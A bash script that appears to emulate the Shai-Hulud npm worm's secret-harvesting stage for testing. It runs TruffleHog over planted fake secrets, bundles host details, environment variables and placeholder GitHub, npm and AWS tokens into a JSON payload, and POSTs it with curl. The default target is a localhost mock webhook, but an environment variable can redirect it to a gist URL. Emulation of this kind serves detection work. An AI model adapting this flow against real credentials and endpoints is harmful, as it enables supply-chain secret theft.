#!/usr/bin/env bash
set -e

# Scenario 2: TruffleHog Secret Scanning Simulation (enhanced)

# Load environment variables if not already set
if [ -z "${FAKE_GITHUB_TOKEN-}" ]; then
  SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
  ROOT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
  if [ -f "$ROOT_DIR/.env" ]; then
    set -a
    # shellcheck disable=SC1090
    . "$ROOT_DIR/.env"
    set +a
  fi
  export FAKE_GITHUB_TOKEN="${FAKE_GITHUB_TOKEN:-ghp_test_token_abcdef}"
  export FAKE_NPM_TOKEN="${FAKE_NPM_TOKEN:-npm_test_token_12345}"
  export FAKE_AWS_KEY="${FAKE_AWS_KEY:-AKIA_TEST_KEY_12345}"
  export MOCK_WEBHOOK="${MOCK_WEBHOOK:-http://localhost:8080/webhook-receiver}"
fi

TRUFFLEHOG_BIN=""
STUB_BIN="/tmp/trufflehog_stub"
RELEASE_TMP="/tmp/trufflehog_release.tar.gz"
EXTRACT_DIR="/tmp/trufflehog_extracted"

if command -v trufflehog >/dev/null 2>&1; then
  TRUFFLEHOG_BIN="$(command -v trufflehog)"
  echo "Using installed TruffleHog: $TRUFFLEHOG_BIN"
else
  OS_NAME="$(uname -s | tr '[:upper:]' '[:lower:]')"
  ARCH_NAME="$(uname -m)"
  
  # Map architecture names to TruffleHog release naming convention
  case "$ARCH_NAME" in
    x86_64) ARCH_NAME="amd64" ;;
    aarch64) ARCH_NAME="arm64" ;;
    arm64) ARCH_NAME="arm64" ;;
    *) ARCH_NAME="amd64" ;;
  esac

  # Try to get latest version from GitHub API, fallback to known version
  if command -v jq >/dev/null 2>&1; then
    TRUFFLEHOG_VERSION="${TRUFFLEHOG_VERSION:-$(curl -sL https://api.github.com/repos/trufflesecurity/trufflehog/releases/latest 2>/dev/null | jq -r '.tag_name' 2>/dev/null)}"
  else
    TRUFFLEHOG_VERSION="${TRUFFLEHOG_VERSION:-$(curl -sL https://api.github.com/repos/trufflesecurity/trufflehog/releases/latest 2>/dev/null | grep -o '"tag_name"[[:space:]]*:[[:space:]]*"[^"]*"' | head -1 | cut -d'"' -f4)}"
  fi
  TRUFFLEHOG_VERSION="${TRUFFLEHOG_VERSION:-v3.90.8}"
  
  # Strip 'v' prefix for filename (e.g., v3.90.8 -> 3.90.8)
  VERSION_NUM="${TRUFFLEHOG_VERSION#v}"
  
  DOWNLOAD_URL="https://github.com/trufflesecurity/trufflehog/releases/download/${TRUFFLEHOG_VERSION}/trufflehog_${VERSION_NUM}_${OS_NAME}_${ARCH_NAME}.tar.gz"
  
  echo "Downloading TruffleHog ${TRUFFLEHOG_VERSION} from GitHub releases"
  echo "URL: $DOWNLOAD_URL"
  
  if curl -L --fail "$DOWNLOAD_URL" -o "$RELEASE_TMP" 2>/dev/null; then
    echo "Release archive downloaded successfully"
    rm -rf "$EXTRACT_DIR"
    mkdir -p "$EXTRACT_DIR"
    
    if tar -xzf "$RELEASE_TMP" -C "$EXTRACT_DIR" 2>/dev/null; then
      if [ -f "$EXTRACT_DIR/trufflehog" ]; then
        chmod +x "$EXTRACT_DIR/trufflehog"
        TRUFFLEHOG_BIN="$EXTRACT_DIR/trufflehog"
        echo "TruffleHog extracted and ready: $TRUFFLEHOG_BIN"
      else
        echo "Archive extracted but trufflehog binary not found; using stub"
      fi
    else
      echo "Failed to extract archive; using stub"
    fi
  else
    echo "Download failed; using stub for simulation"
  fi

  # Create stub if real binary not available
  if [ -z "$TRUFFLEHOG_BIN" ]; then
    cat > "$STUB_BIN" <<'EOF'
#!/usr/bin/env bash
cat <<'JSON'
{"Detector":"stub","Raw":"fake_secret","Redacted":"***","ExtraData":{"source":"/tmp/fake-secrets/.env"}}
JSON
EOF
    chmod +x "$STUB_BIN"
    TRUFFLEHOG_BIN="$STUB_BIN"
    echo "Using stub binary for simulation"
  fi
fi

mkdir -p /tmp/fake-secrets
echo "fake_api_key=sk-test123456789" > /tmp/fake-secrets/.env
echo "github_token=ghp_faketoken123" > /tmp/fake-secrets/config.yaml

npm init -y >/dev/null 2>&1 || true
timeout 10 npm install test-package >/dev/null 2>&1 &
INSTALL_PID=$!
sleep 2

RESULTS_FILE="/tmp/trufflehog_results.json"
if [ -n "$TRUFFLEHOG_BIN" ]; then
  if "$TRUFFLEHOG_BIN" --results=verified --json filesystem /tmp/fake-secrets > "$RESULTS_FILE" 2>/dev/null; then
    echo "TruffleHog output captured at $RESULTS_FILE"
  else
    echo "TruffleHog execution failed; writing fallback results"
    cat > "$RESULTS_FILE" <<'JSON'
{"Detector":"fallback","Raw":"fake_secret"}
JSON
  fi
else
  echo "TruffleHog unavailable; writing fallback results"
  cat > "$RESULTS_FILE" <<'JSON'
{"Detector":"missing","Raw":"fake_secret"}
JSON
fi

RESULTS_B64="$(base64 < "$RESULTS_FILE" | tr -d '\n')"
PAYLOAD_FILE="/tmp/shai-hulud-secrets.json"

cat > "$PAYLOAD_FILE" <<EOF
{
  "application": {
    "name": "test-evil-package",
    "version": "1.0.0",
    "description": "Simulated Shai-Hulud payload"
  },
  "system": {
    "platform": "$(uname -s)",
    "architecture": "$(uname -m)",
    "platformDetailed": "$(uname -a)",
    "architectureDetailed": "$(sysctl -n hw.optional.arm64 2>/dev/null || echo unknown)"
  },
  "runtime": {
    "nodeVersion": "$(node -v 2>/dev/null || echo unknown)",
    "platform": "$(uname -s)",
    "architecture": "$(uname -m)",
    "timestamp": "$(date -Iseconds)"
  },
  "environment": {
    "USER": "${USER:-unknown}",
    "PATH": "${PATH:-}"
  },
  "modules": {
    "github": {
      "authenticated": false,
      "token": "${FAKE_GITHUB_TOKEN:-unset}",
      "username": "simulated-user"
    },
    "aws": {
      "secrets": ["${FAKE_AWS_KEY:-unset}"]
    },
    "gcp": {
      "secrets": []
    },
    "truffleHog": {
      "available": $([ -n "$TRUFFLEHOG_BIN" ] && echo true || echo false),
      "installed": $(command -v trufflehog >/dev/null 2>&1 && echo true || echo false),
      "version": "$([ -n "$TRUFFLEHOG_BIN" ] && "$TRUFFLEHOG_BIN" --version 2>/dev/null || echo stub)",
      "platform": "$(uname -s)",
      "results": "${RESULTS_B64}"
    },
    "npm": {
      "token": "${FAKE_NPM_TOKEN:-unset}",
      "authenticated": true,
      "username": "simulated-maintainer"
    }
  }
}
EOF

TARGET_URL="${SHAI_HULUD_GIST_URL:-${MOCK_WEBHOOK:-http://localhost:8080/webhook-receiver}}"
echo "Posting simulated secrets to $TARGET_URL"
EXTRA_FLAGS=()
if [ -n "${SHAI_HULUD_GIST_TOKEN-}" ]; then
  EXTRA_FLAGS+=(-H "Authorization: token ${SHAI_HULUD_GIST_TOKEN}")
fi

curl -s -o /tmp/shai_hulud_trufflehog_post.log -w "%{http_code}\n" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" "${EXTRA_FLAGS[@]}" --data-binary "@$PAYLOAD_FILE" || true

# Clean up background npm process if still running
if ps -p "$INSTALL_PID" >/dev/null 2>&1; then
  kill "$INSTALL_PID" 2>/dev/null || true
fi
wait "$INSTALL_PID" 2>/dev/null || true

echo "Scenario 2 complete"

